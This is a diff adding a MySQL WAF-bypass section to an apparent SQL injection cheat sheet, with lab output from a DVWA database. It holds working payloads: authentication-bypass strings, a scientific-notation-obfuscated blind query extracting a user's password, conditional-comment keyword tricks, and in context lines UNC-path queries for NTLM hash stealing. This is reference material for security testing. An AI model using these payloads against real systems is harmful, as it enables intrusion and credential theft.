@@ -33,6 +33,11 @@
 * [MYSQL Out of band](#mysql-out-of-band)
     * [DNS exfiltration](#dns-exfiltration)
     * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
+* [MYSQL WAF Bypass](#mysql-waf-bypass)
+    * [Alternative to information schema](#alternative-to-information-schema)
+    * [Alternative to version](#alternative-to-version)
+    * [Scientific Notation](#scientific-notation)
+    * [Conditional Comments](#conditional-comments)
 * [References](#references)
 
 
@@ -549,6 +554,85 @@ select 'osanda' into outfile '\\\\error\\abc';
 load data infile '\\\\error\\abc' into table database.table_name;
 ```
 
+
+## MYSQL WAF Bypass
+
+### Alternative to information schema
+
+`information_schema.tables` alternative
+
+```sql
+select * from mysql.innodb_table_stats;
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
+| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
+...
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+
+mysql> show tables in dvwa;
++----------------+
+| Tables_in_dvwa |
++----------------+
+| guestbook      |
+| users          |
++----------------+
+```
+
+
+### Alternative to version
+
+```sql
+mysql> select @@innodb_version;
++------------------+
+| @@innodb_version |
++------------------+
+| 5.6.31           |
++------------------+
+
+mysql> select @@version;
++-------------------------+
+| @@version               |
++-------------------------+
+| 5.6.31-0ubuntu0.15.10.1 |
++-------------------------+
+
+mysql> mysql> select version();
++-------------------------+
+| version()               |
++-------------------------+
+| 5.6.31-0ubuntu0.15.10.1 |
++-------------------------+
+```
+
+
+### Scientific Notation
+
+In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.
+The format is: `base 'e' exponent`.
+
+For example:
+* `1e3` represents `1 x 10^3` which is `1000`.
+* `1.5e3` represents `1.5 x 10^3` which is `1500`.
+* `2e-3` represents `2 x 10^-3` which is `0.002`.
+
+The following queries are equivalent:
+* `SELECT table_name FROM information_schema 1.e.tables`
+* `SELECT table_name FROM information_schema .tables`
+
+In the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`.
+This technique can be used to obfuscate queries to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2`
+
+
+### Conditional Comments
+
+* `/*! ... */`: This is a conditional MySQL comment. The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored. 
+    * `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.
+    * `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.
+Examples: `/*!12345UNION*/`, `/*!31337SELECT*/`
+
+
 ## References
 
 - [MySQL Out of Band Hacking - @OsandaMalith](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
@@ -559,3 +643,4 @@ load data infile '\\\\error\\abc' into table database.table_name;
 - [SQL Wiki - netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased)
 - [ekoparty web_100 - 2016/10/26 - p4-team](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
 - [Websec - MySQL - Roberto Salgado - May 29, 2013.](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
+- [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - Oct 19, 2021](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
